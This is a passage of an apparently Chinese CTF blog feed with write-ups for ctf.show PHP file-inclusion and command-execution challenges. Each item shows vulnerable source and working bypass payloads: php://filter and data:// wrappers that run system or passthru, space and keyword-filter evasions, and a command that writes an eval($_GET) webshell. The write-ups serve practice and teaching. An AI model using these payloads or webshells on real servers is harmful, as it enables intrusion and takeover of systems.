class="hljs-keyword">file</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB87"><a href="#WEB87" class="headerlink" title="WEB87"></a>WEB87</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-symbol">$</span>content = <span class="hljs-symbol">$</span>_POST[<span class="hljs-string">'content'</span>];<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"php"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"data"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">":"</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = str_replace(<span class="hljs-string">"."</span>, <span class="hljs-string">"???"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>    file_put_contents(urldecode(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>), <span class="hljs-string">"&lt;?php die('大佬别秀了');?&gt;"</span>.<span class="hljs-symbol">$</span>content); <br>}<br></code></pre></td></tr></tbody></table></figure><p><strong>死亡绕过</strong>：<a href="https://blog.csdn.net/m0_75178803/article/details/130042854">文章1</a> P:<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">文章2</a></p><p>PY1:</p><p>构造<code>php://filter/write=convert.base64-decode/resource=a.php</code>经过两次URL编码后GET传参</p><p>POST传参 <code>&lt;?php system('cat fl0g.php');?&gt;</code>,因为base64可编码字符对于语句<code>&lt;?php die('大佬别秀了');?&gt;</code> ，只有phpdie六个字符，因此随便配上两个字符构成一组即可，构造</p><figure class="highlight abnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span>aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></tbody></table></figure><h3 id="WEB88"><a href="#WEB88" class="headerlink" title="WEB88"></a>WEB88</h3><figure class="highlight gams"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">if</span>(isset(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>])){<br>    <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span> = <span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'file'</span>];<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, <span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>)){<br>        die(<span class="hljs-string">"error"</span>);<br>    }<br>    include(<span class="hljs-symbol">$</span><span class="hljs-keyword">file</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>过滤了PHP、点、等号：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">data:text<span class="hljs-regexp">/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbDBnLnBocCcpOyA/</span>Pg<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB116"><a href="#WEB116" class="headerlink" title="WEB116"></a>WEB116</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>)</span>{<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/http|https|data|input|rot13|base64|string|log|sess/i'</span>,<span class="hljs-variable">$x</span>)){<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'too young too simple sometimes naive!'</span>);<br>    }<br>}<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]:<span class="hljs-string">"5.mp4"</span>;<br><span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Content-Type: video/mp4'</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Length: <span class="hljs-subst">$file</span>"</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>PHP三元运算符</p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">condition</span>) ? expression1 : expression2<br>解释如下：<br><br><span class="hljs-keyword">condition</span>：一个条件表达式，可以是任何能够求值为布尔值的表达式。<br>expression1：如果 <span class="hljs-keyword">condition</span> 为真（即结果为 <span class="hljs-literal">true</span>），则返回的值为 expression1 的值。<br>expression2：如果 <span class="hljs-keyword">condition</span> 为假（即结果为 <span class="hljs-literal">false</span>），则返回的值为 expression2 的值。<br></code></pre></td></tr></tbody></table></figure><h3 id="WEB117"><a href="#WEB117" class="headerlink" title="WEB117"></a>WEB117</h3><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> filter($x){<br>    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match('<span class="hljs-operator">/</span><span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">utf</span>|<span class="hljs-params">zlib</span>|<span class="hljs-params">data</span>|<span class="hljs-params">input</span>|<span class="hljs-params">rot13</span>|<span class="hljs-params">base64</span>|<span class="hljs-params">string</span>|<span class="hljs-params">log</span>|<span class="hljs-params">sess</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>',$<span class="hljs-params">x</span>)</span>){<br>        die('too young too simple sometimes naive!');<br>    }<br>}<br>$file=$_GET<span class="hljs-literal">['<span class="hljs-identifier">file</span>']</span>;<br>$contents=$_POST<span class="hljs-literal">['<span class="hljs-identifier">contents</span>']</span>;<br>filter($file);<br>file<span class="hljs-constructor">_put_contents($<span class="hljs-params">file</span>, <span class="hljs-string">"&lt;?php die();?&gt;"</span>.$<span class="hljs-params">contents</span>)</span>; <br></code></pre></td></tr></tbody></table></figure><p>PHP死亡过滤，但是过滤了base64,rot13:</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE/resource=<span class="hljs-keyword">a</span>.php<br>contents里的内容通过<span class="hljs-built_in">write</span>这个过滤器采用<span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE这个方式进行过滤，把<span class="hljs-meta">&lt;?</span>php die();<span class="hljs-meta">?&gt;</span>这个代码进行过滤扰乱，从而实现绕过<br>注： <span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE这个是将前后两个字符进行交替(abcd==&gt;badc)<br>?<span class="hljs-built_in">file</span>=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">write</span>=<span class="hljs-built_in">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE/resource=<span class="hljs-keyword">a</span>.php<br>POST contents=?&lt;hp pvela$(P_SO[T]<span class="hljs-number">6</span>;)&gt;?<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf_show</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/posts/cf64b99a/"/>
    <url>/posts/cf64b99a/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF_SHOW"></a>CTF_SHOW</h2><p>题目来自于CTF_SHOW的 web入门</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a><a href="">web29</a></h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h4><p>此题利用传入的c参数来进行代码执行，不能算是严谨的命令执行。这里注意会对flag字符串进行匹配，只有不匹配上才会进行代码执行，这里需要绕过这个匹配。<br>这里注意一点，因为浏览器默认不显示php的标签所以需要右键查看源代码，或者直接用grep匹配出flag</p><figure class="highlight nsis"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>、用egrep效果一样egrep=grep  -E<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cat fl*g.php | grep  -E 'fl.g' "</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">2</span>、此种方式需要右键源代码<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cat fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">3</span>、<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">4</span>、倒序输出文本<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac fl*g.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">5</span>、<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">"cp fl*g.php a.txt "</span>)<span class="hljs-comment">;</span><br>访问/a.txt<br><span class="hljs-number">6</span>、直接输出一个php这样就可以直接利用代码了,注意也是右键查看源代码<br>c=<span class="hljs-params">system</span>(<span class="hljs-string">'echo -e " &lt;?php \n error_reporting(0); \n  \<span class="hljs-variable">$c</span>= \<span class="hljs-variable">$_GET</span>[\'</span>c\<span class="hljs-string">']; \n eval(\<span class="hljs-variable">$c</span>); " &gt; a.php'</span>)<span class="hljs-comment">;</span><br>/a.php?c=<span class="hljs-params">system</span>(<span class="hljs-string">"tac flag.php"</span>)<span class="hljs-comment">;</span><br><span class="hljs-number">7</span>、<br>c=highlight_file(next(array_reverse(scandir(<span class="hljs-string">"."</span>))))<span class="hljs-comment">;</span><br>将返回最后一个文件或目录的内容进行语法高亮后的字符串。<br></code></pre></td></tr></tbody></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h4><p>看过滤，web29的第七个方法可用，另外，还有：</p><p>用反引号代替system函数来起到命令执行的效果</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fla*`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">nl</span> fl<span class="hljs-string">''</span>ag.p<span class="hljs-string">''</span>hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fl<span class="hljs-string">''</span>ag.p<span class="hljs-string">''</span>hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> fl*ag.p*hp`;<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cp</span> fl*ag.p*hp 1.txt | <span class="hljs-built_in">cat</span> 1.txt`;<br></code></pre></td></tr></tbody></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>过滤了空格，单引号，点等。</p><p>我们可以看到这道题目，过滤了flag|system|php|cat|sort|shell|.| |’<br>我们可以尝试使用passthru来绕过对system的限制；使用%09来绕过对空格的限制；对小数点的限制可以使用通配符*或者占位符？来绕过。</p><p>因为过滤了小数点.，所有无法使用cp命令来进行尝试。过滤了空格，可以使用%09替代；也可以使用{$IFS}<br>还有pos(localeconv)来获取小数点的方法。放在最后的方法4里面写。</p><p>我们先来找一下flag在哪里。 ?c=passthru(‘ls’); 然后尝试拿flag，发现flag被过滤了，php也被过滤了。cat命令也被过滤了。 cat被过滤可以用tac绕过。<br>flag可以用fla*<br>?c=passthru(“tac%09fla*”);<br>注意这里使用双引号。单引号不行，因为它就是字面意思，%09不会被解释为空格。<br>单引号串和双引号串在PHP中的处理是不相同的。双引号串中的内容可以被解释而且替换，而单引号串中的内容总被认为是普通字符。</p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">方法：<br><span class="hljs-number">01</span> 使用<span class="hljs-keyword">eval</span>嵌套。具体参数：passthru 结合%09<br><br>其中%09绕过空格 ?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=passthru(<span class="hljs-string">"tac%09fla*"</span>); 这里需要注意括号的闭合，&amp;的连接。<br><br><span class="hljs-number">02</span> 使用参数：passthru结合 $IFS$9<br><br>其中$IFS$9绕过空格，注意转义$符号 ?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=passthru(<span class="hljs-string">"tac\$IFS\$9fla*"</span>);<br><br><span class="hljs-number">03</span> 使用未被过滤的命令。passthru直接读取<br><br>?c=passthru(%22tac$IFS$9fla*%22); 也就是passthru(<span class="hljs-string">"tac\$IFS\$9fla*"</span>);<br><br><span class="hljs-number">04</span> 使用<span class="hljs-keyword">pos</span>(localeconv)来获取小数点<br><br>localeconv可以返回包括小数点在内的一个数组；<span class="hljs-keyword">pos</span>去取出数组中当前第一个元素，也就是小数点。 scandir可以结合它扫描当前目录内容。 ?c=print_r(scandir(<span class="hljs-keyword">pos</span>(localeconv()))); 可以看到当前目录下有flag.php 通过array_reverse把数组逆序，通过<span class="hljs-keyword">next</span>取到第二个数组元素，也即flag.php 然后?c=show_source(<span class="hljs-keyword">next</span>(array_reverse(scandir(<span class="hljs-keyword">pos</span>(localeconv())))));<br></code></pre></td></tr></tbody></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    }<br>    <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><h4 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h4><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">过滤空格 和 ;用<span class="hljs-string">?&gt;</span>代替 ;<br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">0</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?p</span>hp echo(<span class="hljs-string">`cat flag.php`</span>);<span class="hljs-string">?&gt;</span><br><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">0</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></tbody></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    }<br>        <br>}<span class="hljs-keyword">else</span>{<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure><p>利用文件包含可以利用伪协议执行命令，data://text/plain,[php代码]</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">'tac f*'</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag|php|file/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;    <br>    }<br></code></pre></td></tr></tbody></table></figure><p>主要是过滤了php标签，绕过：</p><p>在 PHP 中，<code>&lt;?= ?&gt;</code> 是一种简写形式的 PHP 短标签（Short Tags），也称为”echo 标签”。它用于在 HTML 或其他输出上下文中直接输出变量或表达式的值。</p><p><code>&lt;?= ?&gt;</code> 的作用相当于 <code>&lt;?php echo ...; ?&gt;</code>，可以用于输出变量、表达式或函数返回的值。这种短标签的使用使得在模板文件或混合 HTML 和 PHP 代码时，可以更简洁地输出变量值，提高了代码的可读性和简洁性。</p><p>PY:</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">data://<span class="hljs-keyword">text</span>/plain,<span class="hljs-meta">&lt;?</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">"tac f*"</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>])){<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'c'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>, <span class="hljs-variable">$c</span>)){<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">".php"</span>);<br>    } <br></code></pre></td></tr></tbody></table></figure><p>拼接的php可以不用管,include只会处理内部的内容，对flag的过滤可以采用拼接的方式</p><figure class="highlight php-template"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?c=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-string">'tac f*'</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight swift"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>['c'])){<br>    <span class="hljs-variable">$c</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$_GET</span>['c'];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">!</span>preg_match(<span class="hljs-string">"/[0-9]|\~|\`|\@|\#|<span class="hljs-subst">\\</span>$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|<span class="hljs-subst">\'</span>|<span class="hljs-subst">\"</span>|\,|\&lt;|\.|\&gt;|\/|\?|<span class="hljs-subst">\\</span><span class="hljs-subst">\\</span>/i"</span>, <span class="hljs-variable">$c</span>)){<br>        eval(<span class="hljs-variable">$c</span>);<br>    } <br></code></pre></td></tr></tbody></table></figure><p>这里过滤的括号是中文括号，因此可以进行调用各种函数</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?c=highlight<span class="hljs-constructor">_file(<span class="hljs-params">next</span>(<span class="hljs-params">array_reverse</span>(<span class="hljs-params">scandir</span>(<span class="hljs-params">dir</span>)</span>)));<br></code></pre></td></tr></tbody></table></figure><p>第二个payload:</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?c=eval(<span class="hljs-built_in">array</span><span class="hljs-constructor">_pop(<span class="hljs-params">next</span>(<span class="hljs-params">get_defined_vars</span>()</span>)));<br><span class="hljs-number">1</span><br></code></pre></td></tr></tbody></table></figure><p>通过get_defined_vars()拿到所有元素，再用next找到我们要利用的点，array_pop获取，通过post传参即可</p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 